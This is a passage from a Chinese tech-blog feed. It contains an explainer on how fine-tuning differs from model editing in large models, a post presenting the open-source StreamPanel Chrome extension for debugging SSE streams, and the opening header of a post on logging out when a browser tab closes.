.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>这是一篇<strong>面向无算法背景读者</strong>的讲解文章。<br/>
目标不是讲公式，而是讲清楚：<strong>它们在“想解决什么问题、用什么方式、什么时候该用谁”上的根本差异</strong>。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、先给一句话结论（先有整体感）</h2>
<ul>
<li>
<p><strong>参数微调（Fine-tuning）</strong> ：</p>
<blockquote>
<p>通过训练，让模型<strong>整体慢慢学会一类新能力或新风格</strong>。</p>
</blockquote>
</li>
<li>
<p><strong>模型编辑（Model Editing）</strong> ：</p>
<blockquote>
<p>不重新训练模型，只是<strong>精确地改掉模型里“某一句已经学错或过时的知识”</strong> 。</p>
</blockquote>
</li>
</ul>
<p>如果你只记住一句话：</p>
<blockquote>
<p><strong>参数微调 = 再学习一门课</strong><br/>
<strong>模型编辑 = 改教科书里的一句话</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">二、为什么会有这两种方法？</h2>
<h3 data-id="heading-2">1️⃣ 大模型是怎么“学会东西”的？</h3>
<p>大模型在预训练时：</p>
<ul>
<li>看了<strong>海量数据</strong></li>
<li>用**训练（loss + 反向传播）**的方式</li>
<li>把知识“分散地”存进大量参数里</li>
</ul>
<p>结果是：</p>
<ul>
<li>能力很强</li>
<li>但<strong>具体知识并没有明确存在哪一行</strong></li>
</ul>
<p>这带来两个现实问题：</p>
<hr/>
<h3 data-id="heading-3">2️⃣ 现实中的两类修改需求</h3>
<h4 data-id="heading-4">场景 A：</h4>
<blockquote>
<p>“我想让模型<strong>整体更擅长某类任务</strong>”</p>
</blockquote>
<p>比如：</p>
<ul>
<li>更懂医疗文本</li>
<li>更像客服语气</li>
<li>更擅长写代码</li>
</ul>
<p>👉 这是<strong>分布级变化</strong><br/>
👉 适合：<strong>参数微调</strong></p>
<hr/>
<h4 data-id="heading-5">场景 B：</h4>
<blockquote>
<p>“模型只有<strong>某个具体事实是错的</strong>”</p>
</blockquote>
<p>比如：</p>
<ul>
<li>某公司 CEO 变了</li>
<li>某政策更新了</li>
<li>某个人物关系说错了</li>
</ul>
<p>👉 这是<strong>点状知识错误</strong><br/>
👉 适合：<strong>模型编辑</strong></p>
<hr/>
<h2 data-id="heading-6">三、什么是参数微调（Fine-tuning）？</h2>
<h3 data-id="heading-7">1️⃣ 用一句最通俗的话说</h3>
<blockquote>
<p><strong>参数微调 = 用新数据，再训练模型一段时间</strong></p>
</blockquote>
<p>它的流程和你直觉中的“训练模型”几乎一样。</p>
<hr/>
<h3 data-id="heading-8">2️⃣ 参数微调是怎么工作的？（不讲公式版）</h3>
<p>流程大致是：</p>
<ol>
<li>准备一批数据（输入 + 标准答案）</li>
<li>模型给出预测结果</li>
<li>和标准答案做对比，算一个“错了多少”的分数（loss）</li>
<li>模型根据这个分数，<strong>一点点调整参数</strong></li>
<li>重复很多次，直到整体表现变好</li>
</ol>
<p>关键点：</p>
<ul>
<li>❗ <strong>是“整体慢慢变好”</strong></li>
<li>❗ <strong>追求平均意义上的正确</strong></li>
</ul>
<hr/>
<h3 data-id="heading-9">3️⃣ 参数微调一定会改所有参数吗？</h3>
<p><strong>不一定，这一点非常重要。</strong></p>
<p>参数微调 ≠ 一定全量更新参数。</p>
<p>从工程实现上，常见三大类：</p>
<hr/>
<h3 data-id="heading-10">（1）只训练原模型的一部分参数</h3>
<ul>
<li>
<p>冻结大多数层</p>
</li>
<li>
<p>只训练：</p>
<ul>
<li>后几层</li>
<li>某些子模块</li>
</ul>
</li>
</ul>
<p>特点：</p>
<ul>
<li>改动相对温和</li>
<li>但仍然属于“再训练”</li>
</ul>
<hr/>
<h3 data-id="heading-11">（2）不动原模型，增加新参数（在原始模型基础上，加一层神经网络）</h3>
<p>代表方法：</p>
<ul>
<li>LoRA / QLoRA</li>
<li>Adapter</li>
</ul>
<p>直观理解：</p>
<ul>
<li>原模型参数完全冻结</li>
<li>旁边加一个“小补丁”</li>
<li>训练的只是这个补丁</li>
</ul>
<p>但本质仍然是：</p>
<ul>
<li>有训练数据</li>
<li>有 loss</li>
<li>多步训练</li>
</ul>
<p>👉 <strong>所以它们依然是参数微调</strong></p>
<hr/>
<h3 data-id="heading-12">（3）只在“输入侧”增加参数（加一层神经网络处理input）</h3>
<p>代表方法：</p>
<ul>
<li>Prompt Tuning</li>
<li>Prefix Tuning</li>
</ul>
<p>特点：</p>
<ul>
<li>
<p>不改模型结构</p>
</li>
<li>
<p>训练的是：</p>
<ul>
<li>虚拟 prompt</li>
<li>注意力里的偏置</li>
</ul>
</li>
</ul>
<p>本质：</p>
<blockquote>
<p><strong>通过“怎么喂给模型输入”来影响整体行为</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-13">4️⃣ 参数微调的本质特征（总结）</h3>
<ul>
<li>✅ 一定有 loss</li>
<li>✅ 在数据分布上优化</li>
<li>✅ 多步训练、追求收敛</li>
<li>❌ 不保证只改某一条具体知识</li>
</ul>
<hr/>
<h2 data-id="heading-14">四、什么是模型编辑（Model Editing）？</h2>
<h3 data-id="heading-15">1️⃣ 一句话直观理解</h3>
<blockquote>
<p><strong>模型编辑 = 不重新训练模型，只修正它“某个具体问答”的结果</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-16">2️⃣ 模型编辑解决的是什么问题？</h3>
<p>典型问题形式是：</p>
<blockquote>
<p>“当模型被问到 X 时，<br/>
它以后应该回答 Y，而不是原来的 Z。”</p>
</blockquote>
<p>注意：</p>
<ul>
<li>只关心<strong>这一条或少数几条输入输出</strong></li>
<li>不关心整体分布性能是否提升</li>
</ul>
<hr/>
<h3 data-id="heading-17">3️⃣ 模型编辑是怎么做到的？（直觉版）</h3>
<p>核心目标只有三个：</p>
<ol>
<li><strong>这条问答一定要改对（Edit Success）</strong></li>
<li><strong>别影响无关问题（Locality）</strong></li>
<li><strong>改动尽量小（Minimal Change）</strong></li>
</ol>
<p>所以模型编辑不是在“训练模型”，而是在：</p>
<blockquote>
<p><strong>解一个“最小改动、满足约束”的问题</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-18">4️⃣ 模型编辑有没有 loss？</h3>
<p><strong>有，但和微调完全不同。</strong></p>
<ul>
<li>
<p>微调：</p>
<ul>
<li>loss 用来让模型“整体越来越好”</li>
<li>追求收敛</li>
</ul>
</li>
<li>
<p>模型编辑：</p>
<ul>
<li>
<p>loss 只是用来判断：</p>
<ul>
<li>“这条指定问答对不对？”</li>
</ul>
</li>
<li>
<p><strong>一旦满足就停止</strong></p>
</li>
</ul>
</li>
</ul>
<p>👉 <strong>不是训练，而是一次性修复</strong></p>
<hr/>
<h3 data-id="heading-19">5️⃣ 模型编辑的三种典型实现思路（不深入算法）</h3>
<h4 data-id="heading-20">（1）直接改模型内部参数</h4>
<ul>
<li>找到与该知识最相关的层</li>
<li>做非常小的数值修改</li>
</ul>
<p>可以理解为：</p>
<blockquote>
<p>“精准地拧了一下某个螺丝”</p>
</blockquote>
<hr/>
<h4 data-id="heading-21">（2）基于单样本的极少步优化</h4>
<ul>
<li>只用一条问答</li>
<li>加强“不要影响别的地方”的约束</li>
<li>优化 1～几步就停</li>
</ul>
<hr/>
<h4 data-id="heading-22">（3）外接补丁 / 记忆 / 路由</h4>
<ul>
<li>
<p>不直接改主模型</p>
</li>
<li>
<p>遇到特定问题时：</p>
<ul>
<li>走“修正通道”</li>
</ul>
</li>
</ul>
<p>更像是：</p>
<blockquote>
<p>“打补丁而不是重编程序”</p>
</blockquote>
<hr/>
<h2 data-id="heading-23">五、为什么模型编辑不能简单看成“一种微调”？</h2>
<p>这是一个非常容易混淆的点。</p>
<p>关键区别在于：</p>
<h3 data-id="heading-24">1️⃣ 优化目标不同</h3>
<ul>
<li>
<p>参数微调：</p>
<ul>
<li>优化的是 <strong>平均表现</strong></li>
</ul>
</li>
<li>
<p>模型编辑：</p>
<ul>
<li>满足的是 <strong>明确约束</strong></li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-25">2️⃣ 时间尺度不同</h3>
<ul>
<li>微调：分钟 / 小时</li>
<li>模型编辑：秒级</li>
</ul>
<hr/>
<h3 data-id="heading-26">3️⃣ 可逆性不同</h3>
<ul>
<li>
<p>微调：</p>
<ul>
<li>改了就很难回滚</li>
</ul>
</li>
<li>
<p>模型编辑：</p>
<ul>
<li>通常可以撤销某一次修改</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-27">六、最终对照总结表</h2>








































<table><thead><tr><th>维度</th><th>参数微调</th><th>模型编辑</th></tr></thead><tbody><tr><td>修改对象</td><td>行为分布</td><td>具体知识点</td></tr><tr><td>是否训练</td><td>是</td><td>否（或极少步）</td></tr><tr><td>是否追求收敛</td><td>是</td><td>否</td></tr><tr><td>是否用 loss</td><td>是</td><td>是（但仅作约束）</td></tr><tr><td>影响范围</td><td>全局</td><td>局部</td></tr><tr><td>典型用途</td><td>新任务 / 新领域</td><td>修错 / 更新事实</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-28">七、一句话终极总结</h2>
<blockquote>
<p><strong>参数微调是在“教模型学新东西”</strong><br/>
<strong>模型编辑是在“纠正模型已经学错的某一句话”</strong></p>
</blockquote>
<p>如果你理解了这一点，后面的所有技术差异，都会变得非常自然。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件]]></title>    <link>https://juejin.cn/post/7584243498527211520</link>    <guid>https://juejin.cn/post/7584243498527211520</guid>    <pubDate>2025-12-16T07:14:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584243498527211520" data-draft-id="7584013833993846818" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件"/> <meta itemprop="keywords" content="前端,后端,HTTP"/> <meta itemprop="datePublished" content="2025-12-16T07:14:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="喵爸的小作坊"/> <meta itemprop="url" content="https://juejin.cn/user/1679709495365405"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1679709495365405/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    喵爸的小作坊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:14:18.000Z" title="Tue Dec 16 2025 07:14:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">StreamPanel：一个让 SSE 调试不再痛苦的 Chrome 插件</h2>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2d1fe8cc3e483889cc40700b880ab9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=B33cTZOGE0VxBzYklYKsCWCsKSU%3D" alt="z-image_00006_" loading="lazy"/>
<blockquote>
<p>当 Chrome 开发者工具的 Network 面板无法满足你的 SSE 调试需求时，我们选择自己动手做一个。</p>
</blockquote>
<h3 data-id="heading-1">故事的开始</h3>
<p>在开发 AI 应用平台的过程中，我们经常需要调试 Server-Sent Events (SSE) 连接。Chrome 开发者工具虽然强大，但在查看 SSE 报文方面确实有些力不从心：</p>
<ul>
<li>Network 面板中的 EventStream 查看体验不够友好</li>
<li>无法方便地查看 iframe 中的 SSE 连接</li>
<li>缺少针对流式数据的筛选和搜索功能</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79c2da261b4e41358be7ca48b6649a6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=bRndK4i7SYUvjOAVDi5rFwGwEV8%3D" alt="z-image_00007_" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/640290f55b204e5c9b82fd0e0145ac11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=Q%2B%2B0y2NAr4WaiiR%2FMtYNWBWLe5Y%3D" alt="z-image_00008_" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77283396ac234187bbbe9eaabe28b1f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Za154i455qE5bCP5L2c5Z2K:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474057&amp;x-signature=1AJICQDszdy712Ej1p%2B2Vn8Jihk%3D" alt="z-image_00009_" loading="lazy"/></p>
<h3 data-id="heading-2">StreamPanel 是什么</h3>
<p>StreamPanel 是一个 Chrome DevTools 扩展，专门用于监控和调试流式请求。它能够：</p>
<ul>
<li>🔍 <strong>实时监控</strong>：拦截并显示所有 EventSource 和基于 Fetch 的 SSE 连接</li>
<li>📊 <strong>消息检查</strong>：查看详细的消息数据，支持 JSON 语法高亮</li>
<li>🔗 <strong>连接管理</strong>：同时跟踪多个流式连接，包括主页面和 iframe</li>
<li>🎯 <strong>URL 过滤</strong>：按 URL 过滤连接，快速定位目标端点</li>
<li>🔎 <strong>消息筛选</strong>：根据 JSON 字段值进行筛选（支持全等和包含两种模式）</li>
<li>🌓 <strong>深色模式</strong>：自动适配系统主题</li>
</ul>
<h3 data-id="heading-3">安装方法</h3>
<h4 data-id="heading-4">1. 获取源码</h4>
<p>首先，你需要获取 StreamPanel 的源码。可以通过以下方式：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 克隆仓库</span>
git <span class="hljs-built_in">clone</span> https://github.com/bywwcnll/StreamPanel.git
<span class="hljs-built_in">cd</span> StreamPanel
</code></pre>
<p>或者直接下载 ZIP 文件并解压。</p>
<h4 data-id="heading-5">2. 加载到 Chrome</h4>
<ol>
<li>打开 Chrome 浏览器，访问 <code>chrome://extensions/</code></li>
<li>在右上角开启<strong>开发者模式</strong>（Developer mode）</li>
<li>点击<strong>加载已解压的扩展程序</strong>（Load unpacked）</li>
<li>选择 StreamPanel 项目目录</li>
<li>完成！插件已安装</li>
</ol>
<h4 data-id="heading-6">3. 验证安装</h4>
<p>安装成功后，你应该能在扩展程序列表中看到 StreamPanel。打开任意网页的开发者工具（F12），应该能看到一个新的 <strong>Stream Panel</strong> 标签页。</p>
<h3 data-id="heading-7">使用方法</h3>
<h4 data-id="heading-8">基本使用</h4>
<ol>
<li>
<p><strong>打开开发者工具</strong></p>
<ul>
<li>按 <code>F12</code> 或右键选择"检查"</li>
<li>切换到 <strong>Stream Panel</strong> 标签页</li>
</ul>
</li>
<li>
<p><strong>查看连接</strong></p>
<ul>
<li>左侧面板会显示所有检测到的流式连接</li>
<li>每个连接显示 URL、状态、消息数量等信息</li>
<li>连接按创建时间倒序排列，最新的在最上面</li>
</ul>
</li>
<li>
<p><strong>查看消息</strong></p>
<ul>
<li>点击左侧的连接，右侧会显示该连接的所有消息</li>
<li>消息以表格形式展示：ID、类型、数据、时间</li>
<li>点击任意消息可查看详细的 JSON 内容</li>
</ul>
</li>
</ol>
<h4 data-id="heading-9">高级功能</h4>
<h5 data-id="heading-10">URL 过滤</h5>
<p>在顶部工具栏的输入框中输入 URL 关键词，可以快速过滤连接列表。</p>
<h5 data-id="heading-11">消息筛选</h5>
<p>这是 StreamPanel 的核心功能之一，特别适合处理大量消息的场景：</p>
<ol>
<li>点击右上角的<strong>筛选</strong>按钮，显示筛选面板</li>
<li>点击<strong>添加筛选条件</strong></li>
<li>配置筛选条件：
<ul>
<li><strong>字段</strong>：从下拉列表中选择要筛选的 JSON 字段（自动提取所有可用字段）</li>
<li><strong>匹配模式</strong>：选择"全等"或"包含"</li>
<li><strong>筛选值</strong>：输入要匹配的值</li>
</ul>
</li>
<li>可以添加多个筛选条件，使用 AND 逻辑</li>
<li>点击<strong>应用筛选</strong>按钮生效</li>
</ol>
<p><strong>示例场景</strong>：</p>
<p>假设你的 SSE 消息格式如下：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"event"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"message"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"conversation_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"c8f8a2ec-d046-4fcb-84d4-55b42308f68d"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"message_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"fe50c43f-e4b7-4f9d-be73-87cf20ca738f"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"answer"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"饮酒"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>你可以：</p>
<ul>
<li>筛选 <code>event</code> 字段等于 <code>"message"</code> 的消息</li>
<li>筛选 <code>conversation_id</code> 包含 <code>"c8f8"</code> 的消息</li>
<li>同时应用多个条件，比如：<code>event</code> 等于 <code>"message"</code> <strong>且</strong> <code>answer</code> 包含 <code>"酒"</code></li>
</ul>
<h5 data-id="heading-12">支持嵌套字段</h5>
<p>StreamPanel 支持使用点号表示法访问嵌套的 JSON 字段，例如：<code>user.profile.name</code></p>
<h3 data-id="heading-13">技术实现</h3>
<p>StreamPanel 的核心是拦截浏览器的 EventSource 和 Fetch API，实现原理如下：</p>
<pre><code class="hljs language-scss" lang="scss">网页
  └── inject<span class="hljs-selector-class">.js</span> (拦截 EventSource/fetch)
      └── <span class="hljs-attribute">content</span><span class="hljs-selector-class">.js</span> (消息桥梁)
          └── <span class="hljs-attribute">background</span><span class="hljs-selector-class">.js</span> (数据存储)
              └── devtools/panel (UI 显示)
</code></pre>
<h4 data-id="heading-14">关键组件</h4>
<ol>
<li><strong>inject.js</strong>：注入到网页中，拦截 <code>EventSource</code> 构造函数和 <code>fetch</code> API</li>
<li><strong>content.js</strong>：作为注入脚本和后台脚本之间的消息桥梁</li>
<li><strong>background.js</strong>：管理数据存储，处理标签页间的通信</li>
<li><strong>devtools/panel</strong>：在 Chrome DevTools 中显示的 UI 面板</li>
</ol>
<h4 data-id="heading-15">筛选功能实现</h4>
<p>消息筛选功能的核心是：</p>
<ul>
<li>递归提取 JSON 数据中的所有字段（包括嵌套字段）</li>
<li>支持点号表示法访问嵌套属性</li>
<li>使用防抖优化，避免频繁重渲染</li>
<li>分离"待应用"和"已应用"的筛选条件，提供更好的交互体验</li>
</ul>
<h3 data-id="heading-16">使用场景</h3>
<p>StreamPanel 特别适合以下场景：</p>
<ul>
<li><strong>AI 应用开发</strong>：调试 LLM 流式响应</li>
<li><strong>实时数据监控</strong>：查看 WebSocket/SSE 推送的数据</li>
<li><strong>API 调试</strong>：分析流式接口的返回内容</li>
<li><strong>多 iframe 场景</strong>：同时监控主页面和 iframe 中的连接</li>
</ul>
<h3 data-id="heading-17">总结</h3>
<p>StreamPanel 的诞生源于实际开发中的痛点。通过 AI 辅助开发，我们快速实现了一个功能完善的 Chrome 插件，不仅解决了自己的问题，也希望能帮助到更多开发者。</p>
<p>如果你也在为 SSE 调试而烦恼，不妨试试 StreamPanel。项目已开源，欢迎使用和贡献！</p>
<hr/>
<p><strong>项目地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbywwcnll%2FStreamPanel" target="_blank" title="https://github.com/bywwcnll/StreamPanel" ref="nofollow noopener noreferrer">GitHub Repository</a></p>
<p><strong>问题反馈</strong>：欢迎提交 Issue 或 Pull Request</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浏览器及标签页关闭时登出的解决方案]]></title>    <link>https://juejin.cn/post/7584057497206063147</link>    <guid>https://juejin.cn/post/7584057497206063147</guid>    <pubDate>2025-12-16T07:19:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497206063147" data-draft-id="7584061465398296617" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浏览器及标签页关闭时登出的解决方案"/> <meta itemprop="keywords" content="前端,浏览器"/> <meta itemprop="datePublished" content="2025-12-16T07:19:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码农胖大海"/> <meta itemprop="url" content="https://juejin.cn/user/4195392102086967"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浏览器及标签页关闭时登出的解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4195392102086967/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码农胖大海
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:19:12.000Z" title="Tue Dec 16 2025 07:19:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
